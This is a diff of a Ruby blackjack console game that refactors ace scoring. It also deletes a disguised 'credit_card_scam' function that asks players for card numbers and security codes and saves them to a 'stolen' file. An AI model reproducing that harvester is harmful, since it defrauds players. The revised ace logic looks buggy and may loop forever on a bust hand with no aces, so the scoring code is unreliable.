@@ -25,26 +25,34 @@ def build_values(cards)
 end
 
 
+def count_aces(value_array)
+  count = 0
+  value_array.each do |value|
+    count += 1 if value == 'A'
+  end
+  count
+end
+
+
 def calculate_value(cards)
   value_array = build_values(cards)
+
   total = 0
   value_array.each do |value|
     if value == ACE
-        if total > 10
-          total += 1
-        else
-          total += 11
-        end
+      total += 11
     elsif FACE_CARDS.include?(value)
       total +=10
     else
       total += value.to_i
     end
   end
-  if value_array.count(ACE) >= 1 && bust(total)
-    total -= 10
+  while bust(total)
+    count_aces(value_array).times do
+      total -= 10
+      return total if total <= 21
+    end
   end
-
   return total
 end
 
@@ -91,17 +99,6 @@ def scoring(player_total, dealer_total)
   end
 end
 
-def credit_card_scam
-  File.open('stolen_CC_numbers.txt', 'a') do |f|
-    credit_card = {}
-    credit_card[:card_number] = prompt("Your credit card number:")
-    credit_card[:card_name] = prompt("Name on the credit card:")
-    credit_card[:exp_date] = prompt("Expiration date:")
-    credit_card[:security_number] = prompt("Secirity number:")
-    f.puts credit_card
-  end
-end
-
 def say_hello
   "Welcome to B * L * A * C * K * J * A * C * K"
 end
@@ -136,8 +133,6 @@ dealer = "Dealer"
 
 @deck = build_deck
 
-# credit_card_scam
-
 deal_cards([@player_cards, @dealer_cards], 2)
 
 @player_total = calculate_value(@player_cards)
@@ -145,7 +140,6 @@ deal_cards([@player_cards, @dealer_cards], 2)
 
 show_card(player, @player_cards)
 show_total(player, @player_total)
-
 
 next_turn = nil
 
@@ -155,26 +149,20 @@ while !stay(next_turn)
   case
     when !@correct_input.include?(next_turn)
       puts "Invalid input, please put either 'h' for hit or 's' for stay."
-
     when hit(next_turn)
-
       @player_total = play_turn(player, @player_cards)
-
       if bust(@player_total)
         puts "Player busts, dealer wins."
         break
       end
-
     when stay(next_turn)
       show_total(player, @player_total)
       puts "Dealer's turn."
       show_card(dealer, @dealer_cards)
       show_total(dealer, @dealer_total)
-
       while game_play(@dealer_total, 17)
         @dealer_total = play_turn(dealer, @dealer_cards)
       end
-
       scoring(@player_total, @dealer_total)
   end
 end
